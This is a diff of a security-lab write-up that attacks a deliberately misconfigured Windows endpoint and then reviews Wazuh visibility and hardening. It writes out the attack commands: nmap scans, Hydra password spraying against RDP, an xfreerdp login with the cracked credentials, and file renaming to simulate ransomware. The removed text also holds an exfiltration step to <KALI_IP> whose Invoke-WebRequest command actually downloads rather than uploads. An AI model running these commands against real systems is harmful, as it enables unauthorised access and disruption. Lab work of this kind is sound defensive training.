@@ -1,358 +1,296 @@
-# 🟥 Scenario 1 — Low Visibility  
-### *Attacker gains full access due to weak passwords and missing logging*
+# Scenario 1 — Weak Endpoint
+Attacker gains access due to weak credentials and ineffective security visibility
 
-# 🟦 Environment Overview — (Windows Server State)
+## Environment Overview — Initial State
 
-Before the attack begins, the Windows Server environment is intentionally misconfigured.  
-This represents a common real-world scenario in small companies with weak security maturity.
+Before the attack begins, the Windows Server endpoint is intentionally left in a weak, low-maturity security state.
 
----
+Although the operating system is Windows Server 2022, it is treated purely as an endpoint / workstation and not as a hardened enterprise server.
 
-## 🔐 Password & Account Security
-
-### ❌ Weak password policy
-- Password complexity: **Disabled**
-- Minimum length: **0**
-- Maximum password age: **Unlimited**
-- Lockout threshold: **Disabled**
-- Lockout duration: **0**
-- Lockout observation window: **0**
-
-This allows:
-- simple passwords (e.g., Admin123)
-- unlimited brute-force attempts
-- successful password spraying with no timeout
-
-**Screenshot to take:**  
-➡️ `secpol.msc` → Account Policies → Password Policy  
-➡️ `secpol.msc` → Account Lockout Policy
+This setup represents a small logistics company with limited security maturity and no active SOC processes.
 
 ---
 
-## 🌐 Network Exposure
+## Password & Account Security — Initial State
 
-### ✅ Open ports
-| Port | Service | State |
-|------|---------|--------|
-| **3389/tcp** | RDP | **Open** (publicly accessible) |
-| **5985** | WinRM HTTP | Closed |
-| **5986** | WinRM HTTPS | Closed |
-| **445** | SMB | Likely open internally, closed externally |
-| **22** | SSH | Closed |
-| **All others** | Default | Closed |
+The endpoint uses a severely misconfigured password and account policy.
 
-**Risk:**  
-RDP is exposed directly without MFA or IP restrictions.
+- Password complexity: Disabled
+- Minimum password length: 0
+- Maximum password age: Unlimited
+- Account lockout threshold: Disabled
+- Lockout duration: 0
+- Lockout observation window: 0
 
-**Screenshot to take:**  
-➡️ Nmap output confirming 3389 open
+Impact:
+- Very weak passwords are allowed
+- Unlimited authentication attempts are possible
+- Password spraying and brute-force attacks are feasible without interruption
 
----
-
-## 📊 Logging & Visibility
-
-### ❌ Windows Audit Policy (default / minimal)
-- Logon events → **Not fully enabled**
-- Object access → **Disabled**
-- Process creation → **Disabled**
-- Policy change → **Disabled**
-- Directory service access → **Disabled**
-- Filtering platform logs → **Disabled**
-
-This results in:
-- Missing 4625 (failed logon) context
-- Missing 4624 (successful logon) details
-- Missing 4688 (process creation)
-- No visibility into attacker recon or file operations
-
-**Screenshot to take:**  
-➡️ Local Security Policy → Advanced Audit Policy Configuration
+Note:
+The hardened password policy screenshot belongs to the post-incident improvement section.
+The weak baseline is already documented during the OSINT pre-stage.
 
 ---
 
-## 👁️ Sysmon Visibility
+## Network Exposure
 
-### ❌ Sysmon is not installed
-Meaning:
-- No Event ID 1 (process creation)
-- No Event ID 3 (network connections)
-- No Event ID 11 (file creation)
-- No Event ID 12/13 (registry changes)
+The Windows endpoint is directly exposed to the internet.
 
-Without Sysmon, a huge portion of attacker activity is invisible.
+Externally observed services:
+- TCP 3389 — RDP — Open
+- TCP 5986 — WinRM HTTPS — Open
+- TCP 445 — SMB — Filtered
+- TCP 5985 — WinRM HTTP — Filtered
+- TCP 22 — SSH — Closed
 
-**Screenshot to take:**  
-➡️ Programs list / Sysmon missing  
-➡️ PowerShell: `Get-Service sysmon*` → nothing found
+Risk:
+RDP is publicly accessible without MFA, IP allowlisting, or rate limiting.
 
----
-
-## 📡 Wazuh Agent State
-
-### ⚠️ Wazuh agent installed but misconfigured
-- Only a few Windows Security Events are forwarded  
-- Sysmon module missing  
-- No FIM (File Integrity Monitoring)  
-- No Command Execution monitoring  
-- No PowerShell module active  
-
-Effectively:
-- Wazuh receives **almost no telemetry**  
-- Attack chain will not generate alerts  
-- SOC analyst would see very limited or no data
-
-**Screenshot to take:**  
-➡️ Wazuh agent Manager → Missing modules  
-➡️ Wazuh dashboard (empty events)
+Screenshot:
+Nmap.png
 
 ---
 
-## 🧱 Firewall & Exposure
+## Logging & Visibility — Initial State
 
-### ❌ Firewall not hardened
-- RDP allowed from **any IP**  
-- No geoblocking  
-- No brute-force detection  
-- No rate limiting  
-- No network-level segmentation
+Windows auditing is minimally configured.
 
----
+- Logon auditing: partially enabled
+- Process creation auditing: disabled
+- Object access auditing: disabled
+- Policy change auditing: disabled
+- File system auditing: disabled
 
-## 📌 Summary of Weaknesses
-
-This environment suffers from:
-
-- Weak passwords  
-- No password lockout policy  
-- Poor visibility (no Sysmon, weak Audit Policy)  
-- Misconfigured SIEM agent  
-- Exposed RDP service  
-- No SOC response capability  
-
-This makes Scenario 1 a **perfect starting point** to demonstrate how devastating a simple brute-force attack can be in a low-maturity environment.
-
----
----
-
-This is the execution guide you will follow step-by-step while performing the lab.  
-It includes:  
-- What to do  
-- When to screenshot  
-- When to take snapshots  
-- What output to expect  
+Result:
+- Authentication events lack context
+- Attacker activity blends into background noise
+- No meaningful detection capability exists
 
 ---
 
-# 📌 Before You Start
+## Sysmon — Initial State
 
-### ✔ Snapshot the Windows Server VM (GCP)
-Name: `scenario1_start`
+Sysmon is not installed.
 
-### ✔ Snapshot the Kali VM (UTM)
-Name: `scenario1_start`
+Without Sysmon:
+- No process creation telemetry
+- No network connection visibility
+- No file creation or modification events
+- No registry activity monitoring
 
-### ✔ Verify weak logging on Windows
-- No Sysmon  
-- Default/minimal Audit Policy  
-- Wazuh agent misconfigured  
-
-**Screenshot:**  
-➡️ Audit Policy panel  
-➡️ Wazuh agent status (missing modules / errors)
+Large portions of attacker activity are invisible.
 
 ---
 
-# 1️⃣ Reconnaissance From Kali
+## Wazuh Agent — Initial State
 
-### 🔎 1.1 Basic port scan
+The Wazuh agent is installed but poorly configured.
 
-\`\`\`bash
-nmap -sV -p 3389,22 <WINDOWS_IP>
-\`\`\`
+- Limited Windows Security Event forwarding
+- No Sysmon integration
+- No File Integrity Monitoring
+- No meaningful correlation rules
+- No alerting
 
-**Expected result:**
-- 3389/tcp open (RDP)
-- 22/tcp closed
-
-**Screenshot:**  
-➡️ Nmap terminal output
+From a SOC perspective, logs exist but provide no actionable signal.
 
 ---
 
-# 2️⃣ Brute Force (No Lockout Policy)
+## Attack Execution
 
-### 🔐 2.1 Create a simple password list
+### Step 1 — Reconnaissance
 
-\`\`\`bash
-echo -e "Admin123\nPassword123\nWelcome1\nAdmin\nUser123" > small.txt
-\`\`\`
+Port scanning from the attacker system confirms RDP exposure.
 
-### 🔐 2.2 Hydra brute force attack
+Command executed:
+nmap -Pn -p 3389,445,5985,5986 <WINDOWS_IP>
 
-\`\`\`bash
-hydra -l Administrator -P small.txt rdp://<WINDOWS_IP>
-\`\`\`
-
-**Expected:** Hydra finds valid password.
-
-**Screenshot:**  
-➡️ Hydra “login successful” output
+Screenshot:
+Nmap.png
 
 ---
 
-# 3️⃣ RDP Login
+### Step 2 — Username Enumeration
 
-### 💻 3.1 Connect to Windows Server
+A basic username list is prepared based on common enterprise patterns.
 
-\`\`\`bash
-xfreerdp /v:<WINDOWS_IP> /u:Administrator /p:Admin123
-\`\`\`
+Users tested:
+administrator
+admin
+user
+employee
+employee1
 
-**Screenshot:**  
-➡️ Windows desktop after login (timestamp visible)
+Screenshot:
+Users.png
 
 ---
 
-# 4️⃣ Basic Post-Compromise Recon
+### Step 3 — Password Spraying
 
-Run these inside the Windows RDP session.
+A simple password list is created using common weak credentials.
 
-### 🧍 4.1 Identity + hostname
+Passwords tested:
+Welcome1
+Admin123
+Qwerty123
+Password123
+Password1
 
-\`\`\`powershell
+Screenshot:
+Passwords.png
+
+Password spraying attack executed:
+hydra -L users.txt -P passwords.txt rdp://<WINDOWS_IP>
+
+Result:
+Valid credentials discovered
+Username: employee1
+Password: Password123
+
+Screenshot:
+Passwpord_Spraying.png
+
+---
+
+### Step 4 — RDP Login
+
+The attacker logs in using the discovered credentials.
+
+Command executed:
+xfreerdp3 /v:<WINDOWS_IP> /u:employee1 /p:Password123 /cert:ignore
+
+Result:
+Successful user-level access to the system.
+
+Screenshot:
+xfreerdp3-login+reconnaisence.png
+
+---
+
+### Step 5 — Post-Compromise Reconnaissance
+
+The attacker performs basic system reconnaissance.
+
+Commands executed:
 whoami
 hostname
-\`\`\`
-
-### 🖥 4.2 System info
-
-\`\`\`powershell
 systeminfo
-\`\`\`
-
-### 🌐 4.3 Network info
-
-\`\`\`powershell
 ipconfig /all
-\`\`\`
-
-### 👥 4.4 Local user enumeration
-
-\`\`\`powershell
 net user
-\`\`\`
 
-### 📁 4.5 Directory browsing
-
-\`\`\`powershell
-dir C:\Users
-dir C:\Users\Administrator\Desktop
-\`\`\`
-
-**Screenshot:**  
-➡️ A single screenshot showing: whoami, systeminfo, ipconfig, net user
+Result:
+- User-level access confirmed
+- System identity identified
+- Local user structure enumerated
 
 ---
 
-# 5️⃣ Data Discovery & Exfiltration
+### Step 6 — Simulated Ransomware Impact
 
-### 📄 5.1 Create a mock sensitive file
+To simulate ransomware behavior without deploying real malware, files are renamed.
 
-\`\`\`powershell
-echo "Sensitive report, do not share." > C:\Users\Administrator\Desktop\secret.txt
-\`\`\`
-
-**Screenshot:**  
-➡️ File visible on Desktop
-
----
-
-### ⬇ 5.2 Start HTTP server on Kali
-
-\`\`\`bash
-mkdir loot
-cd loot
-python3 -m http.server 8000
-\`\`\`
-
-### ⬆ 5.3 Exfiltrate file from Windows
-
-\`\`\`powershell
-Invoke-WebRequest -Uri http://<KALI_IP>:8000 -OutFile secret.txt
-\`\`\`
-
-Expected:
-- File successfully appears in Kali’s loot directory
-
-**Screenshot:**  
-➡️ HTTP server log showing GET request  
-➡️ secret.txt in Kali’s directory
-
----
-
-# 6️⃣ Fake Ransomware Simulation
-
-### 💣 6.1 Navigate to Documents
-
-\`\`\`powershell
-cd C:\Users\Administrator\Documents
-\`\`\`
-
-### 💣 6.2 Rename all files to simulate encryption
-
-\`\`\`powershell
+Command executed:
 Get-ChildItem -File | Rename-Item -NewName { $_.Name + ".encrypted" }
-\`\`\`
 
-**Screenshot:**  
-➡️ Folder showing files renamed to *.encrypted
+A fake ransom note is left on the desktop demanding cryptocurrency payment.
+
+Screenshot:
+Ransomware+left_behind_message.png
+
+Note:
+No real malware is used.
+This step demonstrates impact and business disruption only.
 
 ---
 
-# 7️⃣ Attacker Exit
+### Step 7 — Attacker Exit
 
-### 🚪 7.1 Clean logout
+The attacker logs out cleanly.
 
-\`\`\`powershell
+Command executed:
 logoff
-\`\`\`
 
 ---
 
-# 8️⃣ What Did the SIEM See? (Almost Nothing)
+## SIEM Visibility During the Attack
 
-Open Wazuh → check:
+Initial review of the Wazuh dashboard suggested no meaningful visibility.
 
-- Security Events  
-- Sysmon events (should be empty)  
-- Windows authentication logs  
-- File modifications  
+After adjusting the time range to match the exact attack window:
+- Approximately 1 hour of activity
+- 1,387 events ingested
+- Mostly authentication noise
+- No alerts triggered
+- No prioritization or correlation
 
-Expected:
-- Very limited or zero meaningful alerts
+Screenshot:
+Noisy_wazuh.png
 
-**Screenshot:**  
-➡️ Empty/partial Wazuh dashboards
-
----
-
-# 9️⃣ Lessons Learned (For Story, Not Execution)
-
-The company realizes the need for:
-
-- Proper Windows Audit Policy  
-- Sysmon installation  
-- Correct Wazuh agent configuration  
-- RDP hardening  
-- Password complexity enforcement  
-- Creation of a basic incident response plan  
+This demonstrates that high log volume without filtering causes malicious activity to disappear in noise.
 
 ---
 
-# 📌 End of Scenario 1
+## Post-Incident Improvements
 
-### ✔ Create snapshots  
-- Windows → `scenario1_end_windows`  
-- Kali → `scenario1_end_kali`
+Following the incident, partial security hardening is applied.
+
+### Password Policy Improvements
+
+- Minimum password length increased
+- Password complexity enabled
+- Password history enforced
+- Maximum password age configured
+
+Account lockout policy remains disabled.
+
+Screenshot:
+Hardened_password_policy.png
 
 ---
+
+### Sysmon Deployment
+
+Sysmon is installed using the SwiftOnSecurity configuration to improve endpoint visibility.
+
+Verification performed:
+Get-Service Sysmon64
+
+Screenshot:
+Sysmon_running.png
+
+---
+
+### Windows Audit Policy Improvements
+
+Audit policy is partially strengthened.
+
+- Logon success and failure enabled
+- Process creation auditing enabled
+- Policy change auditing enabled
+
+Result:
+- Attacker activity now generates telemetry
+- Detection becomes possible
+- Response capability is still missing
+
+---
+
+## Lessons Learned
+
+Scenario 1 demonstrates that:
+- Weak passwords enable trivial compromise
+- Public RDP significantly increases risk
+- Visibility without filtering is ineffective
+- SIEM ingestion alone does not stop attacks
+- SOC processes are as important as tooling
+
+---
+
+## End of Scenario 1 — Weak Endpoint
+
+Snapshots taken:
+scenario1_start
+scenario1_end_windows
+scenario1_end_kali
